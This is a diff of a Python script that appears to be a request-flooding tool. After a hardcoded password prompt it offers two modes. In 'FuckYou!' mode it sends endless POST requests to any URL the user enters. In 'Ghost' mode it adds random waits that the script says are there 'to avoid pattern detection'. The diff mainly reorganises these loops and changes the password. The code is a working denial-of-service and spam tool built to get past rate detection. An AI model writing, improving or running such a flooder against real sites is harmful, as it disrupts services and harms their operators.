@@ -27,8 +27,9 @@ print("")
 print("")
 
 while True:
+		print("")
 		choice2 = input('Enter password to continue: ')
-		if choice2 =='123001':
+		if choice2 =='123001100321':
 			print(Style.BRIGHT + Fore.GREEN + 'Password accepted.' + Fore.RESET)
 			break
 
@@ -49,43 +50,54 @@ while True:
 			break
 
 while True:
-    choice2 = input('Enter [1] for "FuckYou!" mode, or [2] for "Ghost" mode: ')
-    if choice2 == '1':
-        print(Fore.YELLOW + 'FuckYou mode selected. initializing...' + Fore.RESET)
-        sleep(1)
-        print(Style.BRIGHT + Fore.RED + "Let's get that fucker... initializing requests!"+ Fore.RESET)
-        x = input('Enter the HTTP request URL:')
-        counter = 0
-        while True:
-                req = session.post(x)
-                print(req.text)
-                print(Fore.YELLOW + 'request #:'+ Fore.RESET)
-                print(counter)
-                counter +=1
+		choice2 = input('Enter [1] for "FuckYou!" mode, or [2] for "Ghost" mode: ')
+		if choice2 =='1':
+			print(Fore.YELLOW + 'FuckYou mode selected. initializing...' + Fore.RESET)
+			sleep(1)
+			x = input('Enter the HTTP request URL:')
+			print("")
+			print("")
+			print(Style.BRIGHT + Fore.YELLOW + "Let's get that fucker... initializing requests!"+ Fore.RESET)
+			print('')
+			print('')
+			sleep(1)
+			counter = 0
+			while True:
+				counter +=1
+				print('***BOOM, BLASTED!***')
+				req = session.post(x)
+				print(req.text)
+				print(Fore.YELLOW + 'request #:'+ Fore.RESET)
+				print(counter)
 
 
-    elif choice2 == '2':
-        print(Fore.YELLOW + 'Ghost mode selected. initializing...' + Fore.RESET)
-        sleep(1)
-        x = input('Enter the HTTP request URL: ')
-        print("")
-        print("")
-        print(Style.BRIGHT + Fore.RED + "Let's get that fucker... initiating requests!"+ Fore.RESET)
+		elif choice2=='2':
+			print(Fore.YELLOW + 'Ghost mode selected. initializing...' + Fore.RESET)
+			sleep(1)
+			break
 
-        print('')
-        print('') 
+			
 
-        counter = 0
-        while True:
-            counter += 1
+x = input('Enter the HTTP request URL: ')
+print("")
+print("")
 
-            req = session.post(x)
-            print('***BOOM, BLASTED!***')
-            print(req.text)
-            print(Fore.YELLOW + 'Request #:'+ Fore.RESET)
-            print(counter)
-            print(Fore.GREEN + 'Generating a random wait interval to avoid pattern detection...' + Fore.RESET)
-            sleep(randint(1,5))
+print(Style.BRIGHT + Fore.YELLOW + "Let's get that fucker... initiating requests!"+ Fore.RESET)
+
+print('')
+print('') 
+
+counter = 0
+while True:
+	counter += 1
+
+	req = session.post(x)
+	print('***BOOM, BLASTED!***')
+	print(req.text)
+	print(Fore.YELLOW + 'Request #:'+ Fore.RESET)
+	print(counter)
+	print(Fore.YELLOW + 'Generating a random wait interval to avoid pattern detection...' + Fore.RESET)
+	sleep(randint(1,5))
 
 
 input()
